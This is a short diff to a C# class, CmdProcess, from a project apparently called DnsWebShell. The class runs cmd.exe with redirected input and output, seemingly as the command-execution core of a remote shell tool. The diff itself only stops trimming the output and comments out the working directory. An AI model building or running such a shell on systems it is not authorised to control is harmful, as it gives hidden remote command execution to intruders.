@@ -4,7 +4,7 @@ namespace DnsWebShell;
 
 public class CmdProcess
 {
-	public string? Output => _output.Substring(117)??_output;
+	public string? Output => _output;
 	public string? Error => _error;
 
 	private string? _output;
@@ -15,7 +15,7 @@ public class CmdProcess
 	public CmdProcess()
 	{
 		_processInfo.FileName = "cmd.exe";
-		_processInfo.WorkingDirectory = "C://";
+		//_processInfo.WorkingDirectory = "C://";
 		_processInfo.UseShellExecute = false;
 		_processInfo.RedirectStandardInput = true;
 		_processInfo.RedirectStandardOutput = true;
